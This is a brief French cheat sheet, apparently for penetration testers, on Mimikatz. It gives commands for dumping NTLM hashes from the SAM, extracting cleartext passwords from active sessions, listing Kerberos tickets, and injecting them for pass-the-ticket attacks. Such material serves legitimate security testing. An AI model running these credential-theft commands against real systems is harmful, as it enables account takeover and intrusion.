# Mimikatz

**Introduction**\
Mimikatz est un outil puissant pour l'extraction de mots de passe, de hashes et de tickets Kerberos depuis la mémoire d'un système Windows compromis. Il est souvent utilisé dans les tests de pénétration pour démontrer des failles de sécurité dans les systèmes de gestion des mots de passe et des sessions.

**Installation de Mimikatz**

* **Sous Windows** : Téléchargez Mimikatz depuis le dépôt GitHub de Mimikatz ou depuis un site de confiance. Décompressez l’archive ZIP et exécutez `mimikatz.exe` depuis l'invite de commandes (cmd) avec les droits administratifs.

**Utilisation de Base**

1.  **Exécuter Mimikatz**

    ```cmd
    mimikatz
    ```

    **Explication** : Lance l’interface de ligne de commande de Mimikatz pour accéder à ses fonctionnalités.\

2.  **Obtenir les Hashes des Mots de Passe**

    ```cmd
    privilege::debug
    lsadump::sam
    ```

    **Explication** : Active les privilèges de débogage et extrait les hashes NTLM des comptes utilisateurs stockés dans le SAM (Security Accounts Manager).\


**Options Avancées**

1.  **Extraire les Tickets Kerberos**

    ```cmd
    kerberos::list
    ```

    **Explication** : Liste les tickets Kerberos en mémoire, qui peuvent être utilisés pour effectuer des attaques de type pass-the-ticket.\

2.  **Injecter des Tickets Kerberos**

    ```cmd
    kerberos::ptt /path/to/ticket.kirbi
    ```

    **Explication** : Injecte des tickets Kerberos dans le système pour obtenir des accès privilégiés ou contourner les contrôles de sécurité.\


**Exemples d'Extraction**

1.  **Extraire les Mots de Passe des Sessions Actives**

    ```cmd
    sekurlsa::logonpasswords
    ```

    **Explication** : Extrait les mots de passe et les hashes des sessions actives en mémoire.\

2.  **Dump des Hashes NTLM**

    ```cmd
    lsadump::sam
    ```

    **Explication** : Extrait les hashes NTLM des comptes utilisateurs stockés dans le SAM du système.\
